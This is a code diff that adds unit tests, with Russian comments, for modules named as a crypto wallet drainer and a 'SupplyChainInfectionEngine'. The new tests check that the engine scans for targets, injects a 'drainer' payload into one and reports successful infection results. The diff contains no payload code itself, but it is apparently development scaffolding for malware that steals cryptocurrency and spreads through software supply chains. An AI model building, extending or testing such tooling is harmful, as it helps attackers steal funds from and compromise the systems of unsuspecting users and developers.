@@ -16,6 +16,7 @@ import json
 import logging
 from unittest.mock import patch, MagicMock
 from agent_modules.crypto_stealer import WalletDrainer
+from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
 
 # Настраиваем логирование
 logging.basicConfig(level=logging.DEBUG)
@@ -212,6 +213,34 @@ class TestWalletDrainer(unittest.TestCase):
 
     def tearDown(self):
         # Чистим тестовые файлы
+        import shutil
+        shutil.rmtree(self.output_dir, ignore_errors=True)
+
+
+class TestSupplyChainInfectionEngine(unittest.TestCase):
+    def setUp(self):
+        self.output_dir = "/tmp/test_supply_chain"
+        os.makedirs(self.output_dir, exist_ok=True)
+        self.engine = SupplyChainInfectionEngine(output_dir=self.output_dir)
+
+    def test_scan_targets(self):
+        targets = self.engine.scan_targets()
+        self.assertTrue(len(targets) > 0)
+        self.assertIn("type", targets[0])
+
+    def test_inject_payload(self):
+        targets = self.engine.scan_targets()
+        result = self.engine.inject_payload(targets[0], payload_type="drainer")
+        self.assertEqual(result["status"], "success")
+        self.assertEqual(result["payload"], "drainer")
+
+    def test_run_and_report(self):
+        report = self.engine.run()
+        self.assertEqual(report["status"], "success")
+        self.assertIn("infection_results", report)
+        self.assertTrue(os.path.exists(self.output_dir))
+
+    def tearDown(self):
         import shutil
         shutil.rmtree(self.output_dir, ignore_errors=True)
 
